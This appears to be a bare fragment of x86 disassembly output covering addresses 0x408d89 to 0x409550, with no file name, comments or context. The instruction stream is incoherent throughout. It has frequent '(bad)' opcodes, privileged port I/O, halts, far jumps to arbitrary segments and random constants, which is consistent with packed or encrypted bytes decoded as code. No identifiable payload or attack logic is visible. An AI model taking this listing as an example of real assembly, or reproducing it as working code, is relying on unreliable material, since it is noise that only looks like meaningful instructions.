  408d89:	jg     0x408d34
  408d8b:	fist   DWORD PTR [eax]
  408d8d:	call   0xb840:0xbae13f75
  408d94:	xor    ah,BYTE PTR [ebx]
  408d96:	aas    
  408d97:	(bad)  
  408d98:	repnz xor cl,cl
  408d9b:	or     ah,BYTE PTR [esi+0x44]
  408d9e:	ret    0x19ef
  408da1:	cmp    ah,BYTE PTR [esi+0x36]
  408da4:	outs   dx,DWORD PTR ds:[esi]
  408da5:	jmp    0x8143f6e5
  408daa:	jns    0x408df7
  408dac:	xchg   DWORD PTR [eax-0xe],ebx
  408daf:	cmc    
  408db0:	stc    
  408db1:	out    dx,eax
  408db2:	inc    edx
  408db3:	add    DWORD PTR [ecx+0x66352232],eax
  408db9:	je     0x408e23
  408dbb:	xchg   edx,eax
  408dbc:	cli    
  408dbd:	push   0x9e348953
  408dc2:	and    ebp,edx
  408dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dc5:	gs popa 
  408dc7:	(bad)  
  408dc8:	ss in  eax,dx
  408dca:	pop    ebp
  408dcb:	mov    dh,0x4
  408dcd:	dec    esi
  408dce:	in     eax,dx
  408dcf:	adc    DWORD PTR [edi+0x4f1d9964],edi
  408dd5:	jae    0x408dbb
  408dd7:	adc    bh,BYTE PTR [edx]
  408dd9:	jns    0x408de7
  408ddb:	jns    0x408de5
  408ddd:	(bad)  
  408dde:	pop    ebp
  408ddf:	push   esp
  408de0:	cwde   
  408de1:	and    dh,cl
  408de3:	ins    DWORD PTR es:[edi],dx
  408de4:	out    0xef,eax
  408de6:	inc    ecx
  408de7:	imul   edi,ecx,0x9f0966c7
  408ded:	push   ss
  408dee:	xchg   ebp,eax
  408def:	pop    ebx
  408df0:	pop    edx
  408df1:	pop    es
  408df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408df3:	pop    ecx
  408df4:	std    
  408df5:	jge    0x408e5c
  408df7:	cli    
  408df8:	pop    ebp
  408df9:	imul   esp,esi,0x5b
  408dfc:	jbe    0x408e04
  408dfe:	fisub  WORD PTR [edx-0x13]
  408e01:	gs jg  0x408dfc
  408e04:	push   0x5ff55485
  408e09:	and    DWORD PTR [ebx+esi*2+0x5c],ecx
  408e0d:	ds pop esp
  408e0f:	mov    al,0x89
  408e11:	bound  eax,QWORD PTR [ebx+0x68c2e340]
  408e17:	or     BYTE PTR [ebp+0x2b3e3da0],0x3c
  408e1e:	push   ds
  408e1f:	rcr    BYTE PTR [ebx+0x26],1
  408e22:	in     al,dx
  408e23:	mov    edx,0x3e0221f7
  408e28:	aaa    
  408e29:	mov    ch,BYTE PTR ss:[ebp+0x20]
  408e2d:	adc    BYTE PTR [edi-0x17fafdda],bh
  408e33:	adc    esi,DWORD PTR [esi]
  408e35:	pop    ebp
  408e36:	adc    DWORD PTR [ecx+0x43],ebp
  408e39:	test   al,0x8d
  408e3b:	dec    ecx
  408e3c:	lods   eax,DWORD PTR ds:[esi]
  408e3d:	les    esp,FWORD PTR [edi+0x58]
  408e40:	aam    0x99
  408e42:	cmp    BYTE PTR [ebx+0x27],ch
  408e45:	rol    BYTE PTR [ebx+0x397e8e3a],1
  408e4b:	mov    eax,eax
  408e4d:	inc    eax
  408e4e:	or     DWORD PTR [edi],esp
  408e50:	add    DWORD PTR [edi-0x73],esi
  408e53:	cwde   
  408e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e55:	ret    
  408e56:	cmp    edx,DWORD PTR ds:0x383c3f73
  408e5c:	mov    bl,0x2e
  408e5e:	inc    ebx
  408e5f:	fimul  WORD PTR [ebx-0x3f]
  408e62:	mov    eax,0xc86318f0
  408e67:	idiv   al
  408e69:	or     BYTE PTR [edi-0x2],bh
  408e6c:	jmp    0x8ab8:0xfb8015f4
  408e73:	ror    ch,cl
  408e75:	push   edx
  408e76:	cs fwait
  408e78:	arpl   WORD PTR [edx],ax
  408e7a:	jno    0x408e11
  408e7c:	test   BYTE PTR [eax],dl
  408e7e:	mov    ecx,0x8f9d8ec4
  408e83:	shl    DWORD PTR [edx-0x2a],0x66
  408e87:	shr    dh,cl
  408e89:	jg     0x408e1f
  408e8b:	lods   al,BYTE PTR ds:[esi]
  408e8c:	repnz std 
  408e8e:	add    DWORD PTR [ebx+0x44f5dbc1],edi
  408e94:	add    al,0xd0
  408e96:	popf   
  408e97:	push   esi
  408e98:	inc    esi
  408e99:	jb     0x408e2b
  408e9b:	jmp    0xe6c2e4cf
  408ea0:	or     eax,ecx
  408ea2:	xor    DWORD PTR [ecx+0x270ebfea],esp
  408ea8:	dec    edx
  408ea9:	xchg   esi,eax
  408eaa:	out    dx,eax
  408eab:	mov    edx,0xec95b609
  408eb0:	mov    ds:0xf6d9f93f,eax
  408eb5:	clc    
  408eb6:	int3   
  408eb7:	fsub   QWORD PTR [ebx+0x510a94f]
  408ebd:	fisubr DWORD PTR ss:[ebp-0x5a]
  408ec1:	add    ebp,DWORD PTR [esi+0x79]
  408ec4:	dec    ebp
  408ec5:	fcom   DWORD PTR [eax]
  408ec7:	mov    ah,0x3c
  408ec9:	push   edx
  408eca:	loopne 0x408e77
  408ecc:	adc    al,BYTE PTR [esi-0x72b1488f]
  408ed2:	jo     0x408ebe
  408ed4:	inc    ecx
  408ed5:	push   edi
  408ed6:	xor    al,0xcf
  408ed8:	mov    ebp,0xc23b383a
  408edd:	xchg   esi,eax
  408ede:	pop    ss
  408edf:	pusha  
  408ee0:	mov    DWORD PTR [ebp-0x40],esi
  408ee3:	sub    al,0xec
  408ee5:	shl    BYTE PTR [ebx],0x31
  408ee8:	enter  0x9356,0x3e
  408eec:	mov    esi,0x8b75fbfa
  408ef1:	inc    ecx
  408ef2:	out    0x5d,eax
  408ef4:	add    BYTE PTR [ebx-0xd],dl
  408ef7:	hlt    
  408ef8:	sbb    al,dh
  408efa:	pand   mm2,QWORD PTR [ebx+0x13]
  408efe:	inc    ebp
  408eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f00:	jg     0x408efe
  408f02:	cmp    al,BYTE PTR [esi-0x44ebbe16]
  408f08:	cwde   
  408f09:	leave  
  408f0a:	xchg   BYTE PTR [edi+0x2d],bl
  408f0d:	ret    
  408f0e:	iret   
  408f0f:	add    DWORD PTR [ecx],ecx
  408f11:	pop    es
  408f12:	sbb    al,0xa2
  408f14:	cdq    
  408f15:	cwde   
  408f16:	sahf   
  408f17:	cmp    eax,0x3d6ba21f
  408f1c:	sbb    dl,dh
  408f1e:	adc    al,BYTE PTR [ecx-0x34]
  408f21:	retf   0x455
  408f24:	mov    esp,0xc3edc4e9
  408f29:	js     0x408ec8
  408f2b:	daa    
  408f2c:	adc    eax,0x7d39a852
  408f31:	lods   eax,DWORD PTR ds:[si]
  408f33:	sub    ecx,ecx
  408f35:	mov    esp,0x943386c1
  408f3a:	xchg   edi,eax
  408f3b:	add    eax,0x8b19c270
  408f40:	test   BYTE PTR [ebp-0x5c066750],ah
  408f46:	adc    al,0x13
  408f48:	in     al,0x85
  408f4a:	in     al,dx
  408f4b:	(bad)  
  408f4c:	ins    BYTE PTR es:[edi],dx
  408f4d:	out    dx,eax
  408f4e:	adc    edi,DWORD PTR [esi]
  408f50:	mov    bh,0xab
  408f52:	adc    eax,0x3edab88
  408f57:	imul   ecx,esp,0xffffffbd
  408f5a:	or     dh,BYTE PTR [esi-0x12]
  408f5d:	shl    dl,cl
  408f5f:	sub    al,bh
  408f61:	aas    
  408f62:	cmp    ecx,DWORD PTR [ecx+0xd]
  408f65:	es push es
  408f67:	hlt    
  408f68:	popf   
  408f69:	mov    ds:0xd68aaac7,eax
  408f6e:	ss jmp 0xa0b7a129
  408f74:	das    
  408f75:	out    dx,al
  408f76:	test   DWORD PTR [ecx-0x40694263],edi
  408f7c:	mov    al,ds:0x28aefaec
  408f81:	mov    dh,BYTE PTR [ecx]
  408f83:	jbe    0x408f06
  408f85:	xor    BYTE PTR [esi-0xc83289a],bl
  408f8b:	retf   0xf4a6
  408f8e:	rcr    DWORD PTR [ebx-0x58],1
  408f91:	repz mov eax,0x97b9a995
  408f97:	std    
  408f98:	push   ecx
  408f99:	add    dh,BYTE PTR [ecx]
  408f9b:	jg     0x408f70
  408f9d:	sar    DWORD PTR [eax],0x82
  408fa0:	adc    BYTE PTR ds:0x77e4bb2c,0x68
  408fa7:	sub    eax,0xb0f0eb03
  408fac:	scas   eax,DWORD PTR es:[edi]
  408fad:	clc    
  408fae:	ficomp DWORD PTR [ebx]
  408fb0:	push   cs
  408fb1:	popa   
  408fb2:	dec    eax
  408fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fb4:	mov    dh,ah
  408fb6:	xchg   edx,eax
  408fb7:	aad    0x82
  408fb9:	pop    ebx
  408fba:	fcmovb st,st(4)
  408fbc:	stos   DWORD PTR es:[edi],eax
  408fbd:	rcr    DWORD PTR [ebp-0x1311f11f],1
  408fc3:	int3   
  408fc4:	and    eax,0x6eb4f9f
  408fc9:	cmp    DWORD PTR [esi-0x4b298bd8],esp
  408fcf:	adc    eax,DWORD PTR [esi+0x36]
  408fd2:	pop    ebp
  408fd3:	pop    esp
  408fd4:	test   DWORD PTR [esi-0x56],esi
  408fd7:	imul   ecx,edx,0xffffffa7
  408fda:	repnz sti 
  408fdc:	jne    0x408fb0
  408fde:	aaa    
  408fdf:	jae    0x409037
  408fe1:	mov    ah,0x3d
  408fe3:	and    al,0xcf
  408fe5:	mov    esp,0x3d98b40c
  408fea:	jge    0x409059
  408fec:	jo     0x40901d
  408fee:	mov    ch,0x72
  408ff0:	adc    cl,dh
  408ff2:	sub    DWORD PTR [esi],ebx
  408ff4:	and    eax,0x5394587
  408ff9:	loope  0x409060
  408ffb:	stos   BYTE PTR es:[edi],al
  408ffc:	pop    edi
  408ffd:	das    
  408ffe:	push   esp
  408fff:	mov    eax,ds:0x42727d5a
  409004:	cmp    BYTE PTR [esi],dh
  409006:	enter  0x8722,0xe6
  40900a:	xor    BYTE PTR [edi-0x73],al
  40900d:	inc    edi
  40900e:	and    ebp,esi
  409010:	add    BYTE PTR [ebp-0x78],dh
  409013:	inc    esi
  409014:	jb     0x409032
  409016:	mov    ebp,0x6f2df635
  40901b:	jl     0x409040
  40901d:	out    0xe2,eax
  40901f:	sub    eax,0xca0dad86
  409024:	cwde   
  409025:	retf   
  409026:	ds pop es
  409028:	sbb    DWORD PTR [edi+0x17],edx
  40902b:	mov    dh,0x9d
  40902d:	ja     0x409067
  40902f:	xchg   edx,eax
  409030:	inc    esi
  409031:	add    BYTE PTR [ebx],0xf4
  409034:	sub    esi,ecx
  409036:	(bad)  
  409037:	cmp    edx,DWORD PTR [ebp+0x1]
  40903a:	rol    DWORD PTR [edi],0x82
  40903d:	mov    ebp,0xb4b6158e
  409042:	push   esi
  409043:	jmp    0x3599e932
  409048:	pop    edi
  409049:	(bad)  
  40904a:	lahf   
  40904b:	lods   eax,DWORD PTR ds:[esi]
  40904c:	loope  0x409008
  40904e:	loopne 0x4090ce
  409050:	pop    edx
  409051:	fcom   st(0)
  409053:	arpl   bx,bp
  409055:	inc    edx
  409056:	pop    ebx
  409057:	mov    ebp,0x520c9137
  40905c:	adc    BYTE PTR ss:[eax+eax*4+0x5f],bh
  409061:	fnsave [ebp+edx*8-0x6879f1cf]
  409068:	mov    gs,ecx
  40906a:	jo     0x4090a8
  40906c:	inc    esp
  40906d:	jo     0x40907a
  40906f:	sub    DWORD PTR [esp+ebp*8-0x61],ebx
  409073:	repnz dec eax
  409075:	jo     0x4090b8
  409077:	cmc    
  409078:	jmp    0xdc7a:0x3e460f99
  40907f:	popf   
  409080:	push   esi
  409081:	int    0x9c
  409083:	pop    ebp
  409084:	fcom   DWORD PTR [ebp-0x3a]
  409087:	jmp    0xcada0be5
  40908c:	std    
  40908d:	jmp    0xf4c8:0x6893147a
  409094:	or     ecx,DWORD PTR [ebp+0x50]
  409097:	mov    ecx,esp
  409099:	mov    esp,0x83fd7680
  40909e:	mov    DWORD PTR [bx-0x2e8d],edx
  4090a3:	pushf  
  4090a4:	cmp    DWORD PTR [esp-0x77],ecx
  4090a8:	bound  ebp,QWORD PTR [eax-0x899277a]
  4090ae:	ret    0xdbe0
  4090b1:	cmp    bh,BYTE PTR [ebp+eiz*8+0x2e]
  4090b5:	mov    ss:0x899f64d0,al
  4090bb:	frstor [ebx+0x61527515]
  4090c1:	inc    ecx
  4090c2:	repnz shr BYTE PTR [ecx+0x3f8e0d0f],cl
  4090c9:	xchg   DWORD PTR [edx],esi
  4090cb:	jmp    0xd44012e0
  4090d0:	ja     0x4090c0
  4090d2:	fcmovne st,st(0)
  4090d4:	dec    ebp
  4090d5:	test   eax,0xd4785287
  4090da:	mov    cl,0xf5
  4090dc:	and    eax,0xe48f2479
  4090e1:	ins    BYTE PTR es:[edi],dx
  4090e2:	out    dx,al
  4090e3:	ds clc 
  4090e5:	cwde   
  4090e6:	dec    edi
  4090e7:	pop    ds
  4090e8:	scas   eax,DWORD PTR es:[edi]
  4090e9:	shr    DWORD PTR [ebx],1
  4090eb:	xlat   BYTE PTR ds:[ebx]
  4090ec:	add    al,0xe
  4090ee:	dec    esi
  4090ef:	sub    al,0xa9
  4090f1:	popa   
  4090f2:	xchg   ebp,eax
  4090f3:	icebp  
  4090f4:	mov    ds:0x398fb23e,al
  4090f9:	loopne 0x409117
  4090fb:	jne    0x409160
  4090fd:	or     dh,dl
  4090ff:	test   DWORD PTR [ebp-0x5749b436],ebp
  409105:	aas    
  409106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409107:	in     al,dx
  409108:	out    0x71,eax
  40910a:	jmp    0x40908c
  40910c:	jae    0x40916f
  40910e:	xchg   BYTE PTR [ecx+0x34ff328f],ch
  409114:	dec    ebx
  409115:	jno    0x4090dd
  409117:	pusha  
  409118:	jecxz  0x409171
  40911a:	ins    BYTE PTR es:[edi],dx
  40911b:	mov    ebx,0xa65f4a9
  409120:	addr16 mov ds:0x956e,eax
  409124:	cmp    dl,BYTE PTR gs:[ecx-0x27841de0]
  40912b:	scas   eax,DWORD PTR es:[edi]
  40912c:	jbe    0x4090d8
  40912e:	xchg   edi,eax
  40912f:	pop    ss
  409130:	jle    0x409115
  409132:	popa   
  409133:	cmp    eax,0x379a70d4
  409138:	push   ds
  409139:	xor    eax,0x3c4e26c9
  40913e:	stos   BYTE PTR es:[edi],al
  40913f:	jno    0x40911f
  409141:	scas   al,BYTE PTR es:[edi]
  409142:	push   es
  409143:	xor    DWORD PTR [edi-0x45],edi
  409146:	fdivr  QWORD PTR [ebx]
  409148:	outs   dx,DWORD PTR ds:[esi]
  409149:	add    BYTE PTR [ebp-0x38a2af3b],0x61
  409150:	push   ebx
  409151:	inc    dl
  409153:	or     eax,DWORD PTR [edx-0x63ec4c55]
  409159:	inc    ebx
  40915a:	out    dx,al
  40915b:	push   ecx
  40915c:	xor    DWORD PTR [eax-0x6d],esi
  40915f:	aam    0x9f
  409161:	shr    BYTE PTR [edi],cl
  409163:	cmp    BYTE PTR [ebp+0x57],cl
  409166:	lods   al,BYTE PTR ds:[esi]
  409167:	out    0xeb,al
  409169:	loop   0x409127
  40916b:	out    dx,eax
  40916c:	fcom   QWORD PTR ds:0x452efed6
  409172:	cmp    eax,0x103a13d5
  409177:	(bad)  
  409178:	aas    
  409179:	adc    edi,DWORD PTR [edx+0x59f1f962]
  40917f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409180:	shr    BYTE PTR [esi-0x7d5061ad],0x2f
  409187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409188:	pop    esi
  409189:	xchg   ch,ah
  40918b:	aaa    
  40918c:	push   0xe98b7233
  409191:	fld    TBYTE PTR [edx]
  409193:	cmp    esi,DWORD PTR ds:0x36702f02
  409199:	push   edi
  40919a:	hlt    
  40919b:	sar    ebp,0x91
  40919e:	rcl    BYTE PTR [ebp+0x13],0x91
  4091a2:	push   edx
  4091a3:	xchg   edi,eax
  4091a4:	adc    al,0x9b
  4091a6:	(bad)  
  4091a7:	dec    eax
  4091a8:	cmp    edi,DWORD PTR [ecx-0x43]
  4091ab:	(bad)  
  4091ac:	hlt    
  4091ad:	pop    esi
  4091ae:	cwde   
  4091af:	jge    0x409186
  4091b1:	sub    dh,bh
  4091b3:	les    esp,FWORD PTR [edi]
  4091b5:	xor    bh,bl
  4091b7:	not    edi
  4091b9:	leave  
  4091ba:	call   FWORD PTR [eax]
  4091bc:	loop   0x409156
  4091be:	je     0x409156
  4091c0:	mov    ch,0xf
  4091c2:	outs   dx,BYTE PTR ds:[esi]
  4091c3:	in     eax,dx
  4091c4:	stos   BYTE PTR es:[edi],al
  4091c5:	out    0xa7,eax
  4091c7:	inc    ecx
  4091c8:	pop    ebp
  4091c9:	sbb    bl,al
  4091cb:	adc    al,0x30
  4091cd:	or     eax,0x5f609561
  4091d2:	dec    ebx
  4091d3:	xor    al,0xe5
  4091d5:	dec    esi
  4091d6:	sbb    al,0xbf
  4091d8:	cmp    DWORD PTR [edi+0x2a40aea9],eax
  4091de:	gs cld 
  4091e0:	es int 0xb2
  4091e3:	std    
  4091e4:	push   esp
  4091e5:	and    eax,0xb6d64ee
  4091ea:	push   ebx
  4091eb:	mov    ds:0xec59adc9,eax
  4091f0:	aad    0xae
  4091f2:	fisttp QWORD PTR [eax]
  4091f4:	test   DWORD PTR [ecx-0x111023b2],0xba4ebbb4
  4091fe:	lea    edi,[edx+0x7d]
  409201:	or     esi,DWORD PTR ds:0xd773cdc4
  409207:	jo     0x40923c
  409209:	jl     0x4091bb
  40920b:	fisub  WORD PTR [edx]
  40920d:	pop    ebx
  40920e:	xchg   ebp,eax
  40920f:	call   0xe45b:0xdc96a7f8
  409216:	scas   eax,DWORD PTR es:[edi]
  409217:	mov    bl,0xb8
  409219:	mov    edx,0x3a021911
  40921e:	push   esp
  40921f:	pop    ebp
  409220:	mov    BYTE PTR [ebx+0x20],dl
  409223:	mov    eax,0xcf880497
  409228:	ficomp DWORD PTR [eax-0x72]
  40922b:	sar    BYTE PTR [ebx+0x1a0e06d4],0xfb
  409232:	call   0x19a:0x568b412d
  409239:	adc    eax,0x9164b043
  40923e:	mov    BYTE PTR [ebx+0x4f],dh
  409241:	mov    al,ds:0x55e229e1
  409246:	sub    bh,BYTE PTR [edx-0x20]
  409249:	fwait
  40924a:	xchg   esi,eax
  40924b:	xchg   esp,eax
  40924c:	mov    dh,0xa5
  40924e:	dec    ebx
  40924f:	pop    ss
  409250:	mov    dh,0x47
  409252:	xchg   ecx,eax
  409253:	jbe    0x409294
  409255:	mov    bh,0xb2
  409257:	and    ah,BYTE PTR [esi+0x4a]
  40925a:	jae    0x409259
  40925c:	test   DWORD PTR [edi-0x59dbf52f],esp
  409262:	sub    DWORD PTR ds:0xcd3be732,0x64c99f63
  40926c:	adc    al,0xf1
  40926e:	int3   
  40926f:	(bad)  
  409270:	stc    
  409271:	test   al,0xea
  409273:	fild   DWORD PTR [ebx+0x661161de]
  409279:	add    dh,BYTE PTR [eax+0x239f484f]
  40927f:	adc    bl,BYTE PTR [eax+0x9a5b8a5]
  409285:	push   edi
  409286:	adc    al,0xb1
  409288:	cmp    dl,BYTE PTR [edx-0x52853251]
  40928e:	xchg   ecx,eax
  40928f:	xchg   edi,eax
  409290:	cmp    esi,DWORD PTR [ecx+0xd]
  409293:	out    0xbf,eax
  409295:	sub    al,0x9a
  409297:	dec    ebx
  409298:	rcl    BYTE PTR [edi],cl
  40929a:	cmp    al,0x79
  40929c:	in     al,0xbb
  40929e:	xchg   BYTE PTR ds:0xbbfafc3,ch
  4092a4:	test   al,0x1a
  4092a6:	sub    eax,0xc0e8e285
  4092ab:	sub    cl,dh
  4092ad:	data16 jne 0x40931d
  4092b0:	pushf  
  4092b1:	lahf   
  4092b2:	stos   DWORD PTR es:[edi],eax
  4092b3:	addr16 jb 0x409259
  4092b6:	call   0x9d94bb6d
  4092bb:	ss mov bl,0xd7
  4092be:	fimul  DWORD PTR [edx]
  4092c0:	rcl    BYTE PTR ss:[eax-0x74a31783],1
  4092c7:	loop   0x409292
  4092c9:	add    BYTE PTR [ebx-0x57],0x1e
  4092cd:	arpl   si,bp
  4092cf:	out    dx,eax
  4092d0:	pop    esi
  4092d1:	mov    BYTE PTR [esi+eiz*2+0xa],ah
  4092d5:	xchg   ecx,eax
  4092d6:	daa    
  4092d7:	les    edi,FWORD PTR [ebp+0x1]
  4092da:	and    ax,0xd2ec
  4092de:	cmp    BYTE PTR [esi-0x5c8521ad],bh
  4092e4:	out    dx,eax
  4092e5:	cdq    
  4092e6:	push   esp
  4092e7:	cdq    
  4092e8:	imul   dl
  4092ea:	mov    ebp,0xb46e83d0
  4092ef:	mov    ebx,DWORD PTR [ebx]
  4092f1:	xor    ch,dl
  4092f3:	xor    eax,0x72b64696
  4092f8:	and    ah,BYTE PTR [edx-0x32e1db3c]
  4092fe:	adc    eax,0xb9b46f36
  409303:	enter  0x5a9d,0xca
  409307:	fcom   QWORD PTR [eax+0x2a]
  40930a:	dec    esi
  40930b:	out    dx,eax
  40930c:	outs   dx,DWORD PTR ds:[esi]
  40930d:	push   edx
  40930e:	fidivr WORD PTR [eax+0x64]
  409311:	cs push es
  409313:	cmp    DWORD PTR [esi-0x47],edx
  409316:	or     al,0xbc
  409318:	lock mov al,0x44
  40931b:	push   eax
  40931c:	fidivr WORD PTR [ebp-0x3e]
  40931f:	push   esi
  409320:	hlt    
  409321:	(bad)  
  409322:	enter  0xc902,0x6c
  409326:	add    esp,DWORD PTR [edi+0x399a98a8]
  40932c:	and    ah,BYTE PTR [ecx]
  40932e:	fisttp QWORD PTR [esi+0x58]
  409331:	sub    al,cl
  409333:	dec    esi
  409334:	adc    BYTE PTR [eax],ch
  409336:	sub    ebx,DWORD PTR [edx-0x42]
  409339:	xor    eax,0x2bb79255
  40933e:	inc    esp
  40933f:	test   ebp,ebp
  409341:	rcl    BYTE PTR [ebx],1
  409343:	cmp    al,0x97
  409345:	xchg   ecx,eax
  409346:	lock rcl BYTE PTR [edx-0x697f5da],1
  40934d:	adc    eax,0x82ca196f
  409352:	jb     0x4093d2
  409354:	jg     0x4092f1
  409356:	out    dx,al
  409357:	std    
  409358:	cmp    eax,0x4163cbee
  40935d:	in     al,0xe9
  40935f:	sbb    ecx,DWORD PTR [ebx-0x73]
  409362:	pop    edi
  409363:	dec    eax
  409364:	out    dx,eax
  409365:	pusha  
  409366:	and    eax,DWORD PTR [eax+eiz*1+0x56]
  40936a:	stc    
  40936b:	push   cs
  40936c:	mov    dl,0x52
  40936e:	jo     0x409355
  409370:	ds ds xor eax,0xfe7fdbc9
  409377:	nop
  409378:	jle    0x409318
  40937a:	shl    BYTE PTR [edi+0x4b],cl
  40937d:	dec    ebp
  40937e:	jle    0x409351
  409380:	daa    
  409381:	mov    edx,0x70770f3f
  409386:	xchg   esi,eax
  409387:	or     al,0xc2
  409389:	sbb    edi,eax
  40938b:	in     eax,dx
  40938c:	jb     0x409315
  40938e:	pop    esi
  40938f:	pushf  
  409390:	iret   
  409391:	mov    ebp,0xe03ad181
  409396:	dec    ebx
  409397:	fsubr  DWORD PTR [esi+0x393fd7ed]
  40939d:	sbb    BYTE PTR [eax-0x67f3becf],dh
  4093a3:	pop    es
  4093a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093a5:	mov    al,0xe6
  4093a7:	dec    ebp
  4093a8:	and    esi,esp
  4093aa:	adc    al,0x57
  4093ac:	mov    dl,0x64
  4093ae:	test   eax,0xc58a77c7
  4093b3:	lods   eax,DWORD PTR ds:[esi]
  4093b4:	sub    BYTE PTR [ecx],ah
  4093b6:	pop    edi
  4093b7:	out    0x22,eax
  4093b9:	(bad)  
  4093ba:	xor    eax,DWORD PTR [eax-0x7a64180f]
  4093c0:	mov    dl,0x7a
  4093c2:	mov    esp,es
  4093c4:	jmp    0x40937a
  4093c6:	fdiv   st(3),st
  4093c8:	icebp  
  4093c9:	out    dx,al
  4093ca:	pop    ecx
  4093cc:	jl     0x40941b
  4093ce:	push   edi
  4093cf:	inc    esp
  4093d0:	clc    
  4093d1:	pusha  
  4093d2:	test   edi,ebx
  4093d4:	xchg   ebp,eax
  4093d5:	lods   al,BYTE PTR ds:[esi]
  4093d6:	add    esi,DWORD PTR ds:0x2ed236be
  4093dc:	mov    eax,ds:0x7d3d8013
  4093e1:	std    
  4093e2:	popa   
  4093e3:	xchg   esp,eax
  4093e4:	test   ebx,eax
  4093e6:	xchg   edi,eax
  4093e7:	ficom  DWORD PTR [esi-0x1066ce48]
  4093ed:	inc    edi
  4093ee:	push   ds
  4093ef:	dec    edx
  4093f0:	lods   ax,WORD PTR ds:[esi]
  4093f2:	sar    BYTE PTR [eax],cl
  4093f4:	idiv   ch
  4093f6:	xor    esp,ebp
  4093f8:	repnz nop
  4093fa:	sub    dl,BYTE PTR [edx-0x64d21db5]
  409400:	or     BYTE PTR [ebx],bl
  409402:	mov    ebx,0x5aad04a7
  409407:	dec    ebx
  409408:	cld    
  409409:	fst    QWORD PTR [edi+0x1800b6a0]
  40940f:	out    dx,eax
  409410:	mov    DWORD PTR [ecx+0x59],edx
  409413:	sub    ah,BYTE PTR [ebp+0x7f27f00b]
  409419:	push   ss
  40941a:	call   0x9ecb:0x6df79fc7
  409421:	mov    dh,0x33
  409423:	adc    al,0xda
  409425:	pusha  
  409426:	in     eax,dx
  409427:	push   ds
  409428:	and    DWORD PTR [ecx-0x50],ebp
  40942b:	mov    eax,0xe3974fb
  409430:	ret    0xeb6b
  409433:	adc    DWORD PTR [esi+0x4b],esp
  409436:	sti    
  409437:	mov    eax,0x4e1ac2e2
  40943c:	and    DWORD PTR [edx-0x6e624ef5],ebx
  409442:	test   DWORD PTR [ebx+edx*2],ebx
  409445:	daa    
  409446:	fmul   DWORD PTR [ecx+0x255c546f]
  40944c:	outs   dx,BYTE PTR ds:[esi]
  40944d:	aas    
  40944e:	(bad)  
  40944f:	mov    edx,0x688ebabf
  409454:	mov    dh,0x48
  409456:	aaa    
  409457:	cld    
  409458:	icebp  
  409459:	lods   al,BYTE PTR cs:[esi]
  40945b:	dec    eax
  40945c:	and    cl,al
  40945e:	add    eax,DWORD PTR [eax]
  409460:	fcomp  DWORD PTR [esi+0x57]
  409463:	cmp    eax,0x29e703c1
  409468:	mov    edi,0x912dc07d
  40946e:	ret    0x9e15
  409471:	or     edi,ecx
  409473:	fnstcw WORD PTR [esi+0x4a2a2a67]
  409479:	push   ebp
  40947a:	adc    eax,0xa610b852
  40947f:	xchg   ebx,eax
  409480:	loope  0x409441
  409482:	or     DWORD PTR [esi+ebp*1+0x20e90ac],esi
  409489:	fld    QWORD PTR [edi+0x513e9604]
  40948f:	inc    edx
  409490:	js     0x409479
  409492:	mov    ds:0xbe5a4929,eax
  409497:	cld    
  409498:	data16 xor al,0x2
  40949b:	mov    eax,0xdeb9d499
  4094a0:	mov    al,0xaa
  4094a2:	loop   0x40946b
  4094a4:	pop    ds
  4094a5:	pop    es
  4094a6:	retf   0x4f90
  4094a9:	push   ss
  4094aa:	fdivr  DWORD PTR [edi+ebp*8]
  4094ad:	sahf   
  4094ae:	mov    ds:0xe1b8aee7,eax
  4094b3:	stos   BYTE PTR es:[edi],al
  4094b4:	xor    BYTE PTR [ecx+0x8],0x22
  4094b8:	inc    eax
  4094b9:	data16 int 0xd2
  4094bc:	inc    edx
  4094bd:	and    edx,DWORD PTR [edi-0x49]
  4094c0:	ror    BYTE PTR [esi+0x5e],0x60
  4094c4:	int3   
  4094c5:	int    0x95
  4094c7:	pop    ebp
  4094c8:	ins    DWORD PTR es:[edi],dx
  4094c9:	(bad)  
  4094cb:	sub    al,0x24
  4094cd:	sub    BYTE PTR [eax],dl
  4094cf:	rol    BYTE PTR [edx],0xde
  4094d2:	jmp    0x25b4ad94
  4094d7:	mov    ebx,0x1df8f33c
  4094dc:	arpl   bp,bx
  4094de:	bound  eax,QWORD PTR [esi+0x5b83ed6f]
  4094e4:	fwait
  4094e5:	sahf   
  4094e6:	(bad)  
  4094e8:	dec    esp
  4094e9:	js     0x4094f9
  4094eb:	cmc    
  4094ec:	or     DWORD PTR [edx],edx
  4094ee:	pop    edx
  4094ef:	sub    bl,BYTE PTR [ebp+0x6e74a9e0]
  4094f5:	and    al,0xa8
  4094f7:	jge    0x4094ea
  4094f9:	rcl    dl,0x3c
  4094fc:	jmp    0x9cca19f4
  409501:	imul   ebx,DWORD PTR [edx+0x1],0x3d36827e
  409508:	push   ss
  409509:	clc    
  40950a:	dec    eax
  40950b:	into   
  40950c:	adc    bh,bh
  40950e:	sub    al,0x78
  409510:	inc    ecx
  409511:	div    DWORD PTR [edi+edx*2]
  409514:	cli    
  409515:	and    BYTE PTR [edx-0x6e05a692],cl
  40951b:	or     ebp,DWORD PTR [edi+0x61]
  40951e:	cmp    ch,BYTE PTR [ebx+0xa]
  409521:	push   cs
  409522:	jmp    0x40958f
  409524:	sbb    eax,0xf7872bc9
  409529:	inc    edx
  40952a:	jnp    0x409521
  40952c:	xor    ebp,ebx
  40952e:	pop    eax
  40952f:	inc    esp
  409530:	xchg   edx,eax
  409531:	pop    ss
  409532:	movd   DWORD PTR [ebx+0x2b],mm6
  409536:	scas   eax,DWORD PTR es:[edi]
  409537:	(bad)  
  409538:	mov    eax,ds:0x3de6b241
  40953d:	popf   
  40953e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40953f:	shl    DWORD PTR [edx-0x14f93666],1
  409545:	and    al,0x77
  409547:	loop   0x4095bb
  409549:	ins    BYTE PTR es:[edi],dx
  40954a:	add    BYTE PTR [ecx-0x29945fc8],ah
  409550:	fstp   TBYTE PTR [ecx+eax*2+0x54a85483]
